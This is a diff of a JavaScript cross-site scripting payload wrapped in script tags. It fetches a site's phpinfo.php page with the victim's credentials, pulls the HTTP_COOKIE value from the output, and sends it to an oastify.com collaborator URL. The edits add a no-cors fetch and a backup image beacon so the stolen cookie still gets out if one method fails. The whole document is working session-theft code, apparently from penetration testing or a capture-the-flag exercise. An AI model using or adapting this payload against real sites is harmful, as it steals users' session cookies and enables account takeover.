@@ -1,12 +1,13 @@
-
+<script>
 (async () => {
-  const target = "/phpinfo.php"; // adjust path if needed
-  const exfil = "https://rd88es043najc5o0z6ywpo7dt4zvnrbg.oastify.com/steal?cookie=";
+  const target = "/phpinfo.php";
+  const exfil = "https://iugzvjhvkeratw5rgxfn6fo4avgm4js8.oastify.com/steal?cookie=";
 
   try {
     console.log("[XSS] Fetching phpinfo from", target);
 
     const r = await fetch(target, { credentials: "include" });
+
     console.log("[XSS] Response status:", r.status);
 
     const html = await r.text();
@@ -14,7 +15,7 @@
 
     const d = new DOMParser().parseFromString(html, "text/html");
 
-    // Debug: how many rows did we get?
+    // Extract table rows from phpinfo()
     const rows = Array.from(d.querySelectorAll("table tr"));
     console.log("[XSS] Found table rows:", rows.length);
 
@@ -23,32 +24,41 @@
     for (const tr of rows) {
       const keyCell = tr.querySelector("td.e");
       const valCell = tr.querySelector("td.v");
-
       if (!keyCell || !valCell) continue;
 
       const keyText = keyCell.textContent.trim();
       if (keyText === "HTTP_COOKIE") {
         httpCookie = valCell.textContent.trim();
-        console.log("[XSS] Matched HTTP_COOKIE row:", tr);
+        console.log("[XSS] Found HTTP_COOKIE row", tr);
         break;
       }
     }
 
     if (!httpCookie) {
-      console.warn("[XSS] HTTP_COOKIE not found in phpinfo output");
+      console.warn("[XSS] HTTP_COOKIE not found");
       return;
     }
 
     console.log("[XSS] Extracted HTTP_COOKIE:", httpCookie);
 
     const exfilUrl = exfil + encodeURIComponent(httpCookie);
-    console.log("[XSS] Exfiltrating to:", exfilUrl);
+    console.log("[XSS] Exfiltrating:", exfilUrl);
 
-    await fetch(exfilUrl)
-      .then(() => console.log("[XSS] Exfil request sent"))
-      .catch(err => console.error("[XSS] Exfil fetch error:", err));
+    // ---- Primary exfil method (no-cors fetch) ----
+    fetch(exfilUrl, {
+      method: "GET",
+      mode: "no-cors"
+    })
+    .then(() => console.log("[XSS] no-cors fetch sent"))
+    .catch(err => console.error("[XSS] no-cors fetch error:", err));
+
+    // ---- Backup exfil method (Image Beacon) ----
+    const i = new Image();
+    i.src = exfilUrl;
+    console.log("[XSS] Image beacon sent");
 
   } catch (e) {
-    console.error("[XSS] Top-level error:", e);
+    console.error("[XSS] Top level error:", e);
   }
 })();
+</script>
